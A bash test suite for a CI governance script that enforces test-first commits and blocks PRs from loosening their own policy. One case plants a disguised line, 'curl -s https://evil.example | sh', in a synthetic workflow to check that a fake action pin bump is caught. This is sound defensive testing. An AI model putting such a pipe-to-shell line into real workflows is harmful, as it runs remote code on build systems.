#!/usr/bin/env bash
# REQ-321: scripts/check-test-first.sh walks git rev-list --reverse --no-merges <base>..<head> and fails when a commit
# adds or changes a source file (under the pack's source_roots, not matching its test_globs) with no matching test change
# (the pack's test_first_rules) in that commit or an earlier listed one — for Rust a #[cfg(test)] hunk in the same .rs
# file also counts — or when neither a listed commit message nor the PR body cites a REQ-NNN. It errors (exit 2), never
# passes, when a source root matches no tracked file, or when in a PR (SPECFLOW_BASE_REF, GITHUB_EVENT_NAME=pull_request,
# or --pr-body-file) its base does not resolve; with no PR range (a push to main) it prints a loud SKIP. A test
# change counts only when it adds a line that is neither blank nor a comment. The template source checks its own PRs
# with scripts/template-pack.yml (fixtures and lib/ are never the test side; lockfiles, non-instruction Markdown and
# uses: pin bumps are not source — a bump replaces each uses: line with the same action at another ref, nothing else). The
# pack is read at the base ref, so a PR cannot relax its own test-first policy (non_source, test_globs, source_roots,
# test_first_rules), and whether the tree is an instance (.specflow.yml or .stack) or the template source is judged at the
# base ref too, so adding or deleting either file cannot swap the policy. The template-source cases run only where scripts/template-pack.yml exists (init removes it from an
# instance). Synthetic repositories under mktemp; no network.
# Covers: REQ-321
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/lib/check.sh"
TF="$ROOT/scripts/check-test-first.sh"
ck "scripts/check-test-first.sh exists and is executable" test -x "$TF"
W="$(mktemp -d)"; trap 'rm_tree "$W"' EXIT
n=0
repo() {  # repo python|tauri|template — a repository with that pack and one base commit
  n=$((n + 1)); R="$W/$1$n"; mkdir -p "$R/.specflow"; : > "$R/.specflow.yml"
  if [ "$1" = template ]; then   # the template source: no .specflow.yml, stacks/ present, scripts/template-pack.yml
    rm -rf "$R/.specflow" "$R/.specflow.yml"; mkdir -p "$R/scripts" "$R/stacks/x" "$R/.claude/commands" "$R/.github/workflows" "$R/src" \
      "$R/tests/governance/fixtures" "$R/tests/governance/lib"
    cp "$ROOT/scripts/template-pack.yml" "$R/scripts/"; echo 'echo a' > "$R/scripts/a.sh"; echo 'pip==1.0' > "$R/scripts/requirements.txt"
    echo 'x: 1' > "$R/stacks/x/pack.yml"; echo '# c' > "$R/.claude/commands/c.md"; : > "$R/src/__init__.py"
    printf 'jobs:\n  g:\n    steps:\n      - uses: actions/checkout@%s # v4.0.0\n      - run: echo hi\n' "$(printf 'a%.0s' $(seq 40))" > "$R/.github/workflows/ci.yml"
    echo '# PR template' > "$R/.github/PULL_REQUEST_TEMPLATE.md"
    printf '#!/usr/bin/env bash\necho ok\n' > "$R/tests/governance/test_a.sh"; echo '{}' > "$R/tests/governance/fixtures/f.json"
    echo 'ck() { :; }' > "$R/tests/governance/lib/check.sh"
  elif [ "$1" = python ]; then
    printf 'stack: python\nsource_roots: [src]\ntest_globs: [tests/**/test_*.py]\ntest_first_rules: ["src/** -> tests/**/test_*.py"]\n' > "$R/.specflow/pack.yml"
    mkdir -p "$R/src/app" "$R/tests"; : > "$R/src/app/__init__.py"; echo 'X = 1' > "$R/src/app/m.py"; echo 'def test_x(): pass' > "$R/tests/test_m.py"
  else
    printf '%s\n' 'stack: tauri' 'source_roots: [src, src-tauri/src]' 'test_globs: [src/**/*.test.ts, src-tauri/tests/**]' \
      'test_first_rules: ["src/**/*.ts -> src/**/*.test.ts", "src-tauri/src/**/*.rs -> src-tauri/tests/** | cfg-test"]' > "$R/.specflow/pack.yml"
    mkdir -p "$R/src/lib" "$R/src-tauri/src"; echo 'export const a = 1;' > "$R/src/lib/a.ts"
    printf 'pub fn g() -> u8 { 1 }\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    #[test]\n    fn t() { assert_eq!(g(), 1); }\n}\n' > "$R/src-tauri/src/c.rs"
  fi
  (cd "$R" && git init -q -b main && git add -A && git commit -qm "base (REQ-100)"); BASE=$(git -C "$R" rev-parse HEAD)
}
c() { (cd "$R" && eval "$1" && git add -A && git commit -qm "$2"); }   # c SNIPPET MESSAGE
tf() { rc=0; out=$(cd "$R" && env -u SPECFLOW_BASE_REF -u GITHUB_EVENT_NAME bash "$TF" --base "$BASE" "$@" 2>&1) || rc=$?; }
repo python; c 'echo "Y = 2" >> src/app/m.py' "feat: y (REQ-101)"; tf
ck "a source change with no test in this or an earlier commit fails, naming the commit and the file" \
  bash -c '[ "$1" = 1 ] && grep -q "$(git -C "$3" rev-parse --short HEAD)" <<<"$2" && grep -q "src/app/m.py" <<<"$2"' _ "$rc" "$out" "$R"
repo python; c 'echo "def test_y(): pass" >> tests/test_m.py' "test: y (REQ-101)"; c 'echo "Y = 2" >> src/app/m.py' "feat: y"; tf
ck "a test in an earlier listed commit passes" [ "$rc" = 0 ]
repo python; c 'echo "def test_y(): pass" >> tests/test_m.py; echo "Y = 2" >> src/app/m.py' "feat: y with its test (REQ-101)"; tf
ck "a test in the same commit passes" [ "$rc" = 0 ]
repo python; c 'echo "def test_y(): pass" >> tests/test_m.py; echo "Y = 2" >> src/app/m.py' "feat: y"; tf
ck "no REQ-NNN in any commit message and no PR body fails" bash -c '[ "$1" = 1 ] && grep -q "REQ-NNN" <<<"$2"' _ "$rc" "$out"
printf 'Implements REQ-101.\n' > "$W/body.md"; tf --pr-body-file "$W/body.md"
ck "…a REQ-NNN in the PR body passes" [ "$rc" = 0 ]
repo python; c 'git rm -q src/app/m.py' "chore: remove m (REQ-101)"; tf
ck "deleting a source file needs no test (the root still matches __init__.py)" [ "$rc" = 0 ]
repo python; c 'echo notes > README.md' "docs (REQ-101)"; tf
ck "a PR touching no source file prints a SKIP and passes" bash -c '[ "$1" = 0 ] && grep -q "^SKIP test-first: the PR touches no source file" <<<"$2"' _ "$rc" "$out"
repo python; c 'echo "# a note" >> tests/test_m.py' "test: comment (REQ-101)"; c 'echo "Y = 2" >> src/app/m.py' "feat: y"; tf
ck "a comment-only test edit does not satisfy a later source change (R15)" bash -c '[ "$1" = 1 ] && grep -q "src/app/m.py" <<<"$2"' _ "$rc" "$out"
repo python; c 'printf "\n\n" >> tests/test_m.py; echo "Y = 2" >> src/app/m.py' "feat: y (REQ-101)"; tf
ck "a whitespace-only test edit in the same commit does not satisfy it either" [ "$rc" = 1 ]
TP="$ROOT/scripts/template-pack.yml"
if [ -f "$TP" ]; then   # the template source only: init-project.sh removes template-pack.yml from every instance
repo template; c 'echo "pip==1.1" > scripts/requirements.txt' "Bump pip from 1.0 to 1.1"; tf
ck "template: a Dependabot-style lockfile bump (no test, no REQ) is not a source change: SKIP" \
  bash -c '[ "$1" = 0 ] && grep -q "^SKIP test-first: the PR touches no source file" <<<"$2"' _ "$rc" "$out"
repo template; c "sed -i.bak 's/checkout@a*/checkout@$(printf 'b%.0s' $(seq 40))/; s/v4.0.0/v4.1.0/' .github/workflows/ci.yml && rm .github/workflows/ci.yml.bak" "Bump actions/checkout"; tf
ck "template: a uses: pin bump is not a source change: SKIP" bash -c '[ "$1" = 0 ] && grep -q "^SKIP test-first" <<<"$2"' _ "$rc" "$out"
repo template; c "sed -i.bak 's/echo hi/echo bye/' .github/workflows/ci.yml && rm .github/workflows/ci.yml.bak" "ci: bye (REQ-101)"; tf
ck "template: any other workflow change needs a governance test" bash -c '[ "$1" = 1 ] && grep -q ".github/workflows/ci.yml" <<<"$2"' _ "$rc" "$out"
repo template; c 'echo "# PR template, reworded" > .github/PULL_REQUEST_TEMPLATE.md' "docs: PR template"; tf
ck "template: non-instruction Markdown under .github/ is not source: SKIP" [ "$rc" = 0 ]
repo template; c 'echo "# reworded" > .claude/commands/c.md' "docs: command (REQ-101)"; tf
ck "template: model-instruction Markdown (.claude/) is source and needs a governance test" [ "$rc" = 1 ]
repo template; c 'echo "{\"a\": 1}" > tests/governance/fixtures/f.json; echo "echo b" >> scripts/a.sh' "feat: b (REQ-101)"; tf
ck "template: a fixture change alone is not a test change for scripts/" [ "$rc" = 1 ]
repo template; c 'echo "echo checked" >> tests/governance/test_a.sh; echo "echo b" >> scripts/a.sh' "feat: b (REQ-101)"; tf
ck "template: a governance test line in the same commit passes" [ "$rc" = 0 ]
repo template; c "sed -i.bak 's|- uses: actions/checkout@a* # v4.0.0|- run: curl -s https://evil.example \\| sh # uses: actions/checkout@$(printf 'b%.0s' $(seq 40))|' .github/workflows/ci.yml && rm .github/workflows/ci.yml.bak" "Bump actions/checkout"; tf
ck "template: a run: line carrying uses: in a comment is not a pin bump (needs a governance test)" \
  bash -c '[ "$1" = 1 ] && grep -q ".github/workflows/ci.yml" <<<"$2" && grep -q "evil" "$3/.github/workflows/ci.yml"' _ "$rc" "$out" "$R"
repo template; c "sed -i.bak '/uses: actions\/checkout/d' .github/workflows/ci.yml && rm .github/workflows/ci.yml.bak" "Drop checkout (REQ-101)"; tf
ck "template: deleting a uses: step is not a pin bump (needs a governance test)" bash -c '[ "$1" = 1 ] && grep -q ".github/workflows/ci.yml" <<<"$2"' _ "$rc" "$out"
repo template; c "sed -i.bak 's|actions/checkout@a*|actions/other@$(printf 'b%.0s' $(seq 40))|' .github/workflows/ci.yml && rm .github/workflows/ci.yml.bak" "Bump actions/checkout"; tf
ck "template: swapping the action itself is not a pin bump" [ "$rc" = 1 ]
ck "the template's pack file names its roots, globs and rules" \
  bash -c 'for k in source_roots test_globs test_first_rules; do grep -q "^$k:" "$1" || exit 1; done; grep -qF "scripts/** ->" "$1"' _ "$ROOT/scripts/template-pack.yml"
fi
repo tauri; c 'echo "export const b = 2;" >> src/lib/a.ts' "feat b (REQ-101)"; tf
ck "tauri: a .ts change with no .test.ts fails" [ "$rc" = 1 ]
repo tauri; c 'mkdir -p src-tauri/tests && echo "#[test] fn i() {}" > src-tauri/tests/i.rs' "test (REQ-101)"; c 'echo "export const b = 2;" >> src/lib/a.ts' "feat b"; tf
ck "tauri: a Rust test does not match a TypeScript change (rules are per source glob)" [ "$rc" = 1 ]
repo tauri; c 'python3 - <<"PY"
p = "src-tauri/src/c.rs"; t = open(p).read()
t = t.replace("pub fn g() -> u8 { 1 }", "pub fn g() -> u8 { 1 }\npub fn h() -> u8 { 2 }")
t = t.replace("fn t() { assert_eq!(g(), 1); }", "fn t() { assert_eq!(g(), 1); }\n    #[test]\n    fn u() { assert_eq!(h(), 2); }")
open(p, "w").write(t)
PY' "feat h (REQ-101)"; tf
ck "tauri: a .rs change with a #[cfg(test)] hunk in the same file passes" [ "$rc" = 0 ]
repo tauri; c 'printf "\npub fn h() -> u8 { 2 }\n" >> src-tauri/src/c.rs' "feat h (REQ-101)"; tf
ck "tauri: a .rs change outside any #[cfg(test)] module, with no test, fails" [ "$rc" = 1 ]
repo python; c 'git rm -rq src' "drop src (REQ-101)"; tf
ck "a source root that matches no tracked file is an error (exit 2) naming it" bash -c '[ "$1" = 2 ] && grep -q "src" <<<"$2"' _ "$rc" "$out"
repo python; rc=0; out=$(cd "$R" && env -u SPECFLOW_BASE_REF -u GITHUB_EVENT_NAME bash "$TF" 2>&1) || rc=$?
ck "no --base and no SPECFLOW_BASE_REF (a push to main): a loud SKIP, exit 0" \
  bash -c '[ "$1" = 0 ] && grep -q "^SKIP test-first: no PR range" <<<"$2"' _ "$rc" "$out"
rc=0; out=$(cd "$R" && env -u SPECFLOW_BASE_REF GITHUB_EVENT_NAME=pull_request bash "$TF" --base no-such-ref 2>&1) || rc=$?
ck "in a PR (GITHUB_EVENT_NAME=pull_request) a --base that does not resolve is an error (exit 2) naming it, never a pass" \
  bash -c '[ "$1" = 2 ] && grep -q "no-such-ref" <<<"$2"' _ "$rc" "$out"
rc=0; out=$(cd "$R" && env -u GITHUB_EVENT_NAME SPECFLOW_BASE_REF=origin/no-such-ref bash "$TF" 2>&1) || rc=$?
ck "…and so is a SPECFLOW_BASE_REF that does not resolve" bash -c '[ "$1" = 2 ] && grep -q "origin/no-such-ref" <<<"$2"' _ "$rc" "$out"
rc=0; out=$(cd "$R" && env -u SPECFLOW_BASE_REF -u GITHUB_EVENT_NAME bash "$TF" --base no-such-ref 2>&1) || rc=$?
ck "…while outside a PR it is a loud SKIP" bash -c '[ "$1" = 0 ] && grep -q "^SKIP test-first: no PR range" <<<"$2"' _ "$rc" "$out"
repo python; c 'printf "non_source: [\"src/app/**\"]\n" >> .specflow/pack.yml; echo "Y = 2" >> src/app/m.py' "feat: y (REQ-101)"; tf
ck "a PR that widens its own pack's non_source (the pack is read at the base) still fails its untested change" \
  bash -c '[ "$1" = 1 ] && grep -q "src/app/m.py" <<<"$2"' _ "$rc" "$out"
repo python; c 'sed -i.bak "s|^test_globs: .*|test_globs: [tests/**/test_*.py, src/**]|" .specflow/pack.yml && rm .specflow/pack.yml.bak; echo "Y = 2" >> src/app/m.py' "feat: y (REQ-101)"; tf
ck "…and so does one that widens test_globs over its source" bash -c '[ "$1" = 1 ] && grep -q "src/app/m.py" <<<"$2"' _ "$rc" "$out"
repo python; c 'sed -i.bak "s|^source_roots: .*|source_roots: [src, lib]|" .specflow/pack.yml && rm .specflow/pack.yml.bak; mkdir -p lib && echo "Z = 1" > lib/z.py; echo "def test_y(): pass" >> tests/test_m.py; echo "Y = 2" >> src/app/m.py' "feat: y (REQ-101)"; tf
ck "…while a PR that only tightens its pack is judged by the base's pack, saying so" \
  bash -c '[ "$1" = 0 ] && grep -q "base" <<<"$2"' _ "$rc" "$out"
repo python; c 'git rm -q .specflow.yml && mkdir -p scripts && printf "source_roots: [scripts]\ntest_globs: [src/**]\n" > scripts/template-pack.yml; echo "Y = 2" >> src/app/m.py' "feat: y (REQ-101)"; tf
ck "an instance PR that deletes .specflow.yml and adds a permissive scripts/template-pack.yml still fails its untested src change" \
  bash -c '[ "$1" = 1 ] && grep -q "src/app/m.py" <<<"$2" && grep -q "\.specflow\.yml" <<<"$2"' _ "$rc" "$out"
if [ -f "$TP" ]; then
repo template; c ': > .stack; echo "echo b" >> scripts/a.sh' "feat: b (REQ-101)"; tf
ck "a template-source PR that adds an empty .stack still counts scripts/ as source (instance-ness is judged at the base), naming .stack" \
  bash -c '[ "$1" = 1 ] && grep -q "scripts/a.sh" <<<"$2" && grep -q "\.stack" <<<"$2"' _ "$rc" "$out"
repo template; c ': > .stack; echo "y: 2" >> stacks/x/pack.yml' "feat: pack (REQ-101)"; tf
ck "…and stacks/ as well" bash -c '[ "$1" = 1 ] && grep -q "stacks/x/pack.yml" <<<"$2"' _ "$rc" "$out"
fi
if git -C "$ROOT" rev-parse --is-inside-work-tree >/dev/null 2>&1; then
  ck "this repository's source roots all match tracked files (the repository checks itself)" \
    bash -c 'cd "$1" && bash scripts/check-test-first.sh --base HEAD --head HEAD' _ "$ROOT"
else
  echo "SKIP: no git work tree at $ROOT — the self-check needs tracked files"
fi
ck "check-test-first.sh reads the pack at the base ref (packinfo.load_at_ref)" grep -qF 'load_at_ref' "$TF"
if ! instance; then
  for s in python tauri flutter; do ck "stacks/$s/pack.yml declares test_first_rules" grep -q '^test_first_rules: \[' "$ROOT/stacks/$s/pack.yml"; done
  ck "init removes scripts/template-pack.yml from an instance" grep -qF 'rm -f scripts/template-pack.yml' "$ROOT/scripts/init-project.sh"
  ck "README's run-quality-gates.sh row says test-first is a separate ci.yml step, not part of the script" \
    bash -c 'row=$(grep "^| \`scripts/run-quality-gates.sh\` |" "$1"); grep -qF "is a separate \`ci.yml\` step, not part of this script" <<<"$row" && ! grep -qF "+ test-first +" <<<"$row"' _ "$ROOT/README.md"
fi
ck "CLAUDE.md places check-test-first.sh in ci.yml's gates job, not in a run-quality-gates.sh section" \
  bash -c 'grep -qF "a \`ci.yml\` gates-job step, not a run-quality-gates.sh section" "$1" && ! grep -qF "gates section 8" "$1"' _ "$ROOT/CLAUDE.md"
ck "run-quality-gates.sh does not run check-test-first.sh (ci.yml does, with the PR's range)" no grep -qF 'check-test-first.sh' "$ROOT/scripts/run-quality-gates.sh"
CI="$ROOT/.github/workflows/ci.yml"
ck "ci.yml runs check-test-first.sh on pull_request with the PR's base and head SHAs and body file" \
  grep -qF 'bash scripts/check-test-first.sh --base "$BASE_SHA" --head "$HEAD_SHA" --pr-body-file "$RUNNER_TEMP/pr-body.md"' "$CI"
ck "ci.yml passes the PR body and SHAs through env, never inside a run: script" python3 - "$CI" <<'PY'
import sys; t = open(sys.argv[1]).read(); o = "{" * 2
for k, e in (("PR_BODY", "body"), ("BASE_SHA", "base.sha"), ("HEAD_SHA", "head.sha")):
    assert f"{k}: ${o} github.event.pull_request.{e} }}}}" in t, k
for block in t.split("\n      - ")[1:]:
    if "run:" in block:
        assert "github.event.pull_request" not in block.split("run:", 1)[1], block[:80]
PY
finish test_check_test_first
